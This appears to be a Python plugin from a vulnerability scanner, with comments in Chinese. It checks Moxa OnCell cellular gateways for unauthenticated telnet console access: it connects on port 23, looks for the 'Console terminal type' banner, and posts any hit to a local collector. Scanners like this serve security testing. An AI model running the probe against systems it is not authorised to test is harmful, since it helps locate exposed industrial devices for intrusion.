#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Moxa OnCell 未授权访问
referer: unknown
author: Lucifer
description: Moxa OnCell telnet直接进入。
'''
import sys
import warnings
import telnetlib
from termcolor import cprint
from urllib.parse import urlparse
import requests
class moxa_oncell_telnet_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        port = 23
        if r"http" in self.url:
            #提取host
            host = urlparse(self.url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            if self.url.find(":") >= 0:
                host = self.url.split(":")[0]
                port = int(self.url.split(":")[1])
            else:
                host = self.url

        try:
            #连接Telnet服务器
            tlib = telnetlib.Telnet(host, port, timeout=6)
            #tlib.set_debuglevel(2)
            #登陆
            result = tlib.read_until(b"Console terminal type", timeout=6)
            tlib.close()
            if result.find(b"Console terminal type") != -1:
                cprint("[+]存在Moxa OnCell 未授权访问漏洞...(高危)\tpayload: "+host+":"+str(port), "red")
                postdata = {self.url:"存在Moxa OnCell 未授权访问漏洞...(高危)\tpayload: "+host+":"+str(port)}
                requests.post('http://localhost:8848/system', json=postdata) 
            else:
                cprint("[-]不存在moxa_oncell_telnet漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = moxa_oncell_telnet_BaseVerify(sys.argv[1])
    testVuln.run()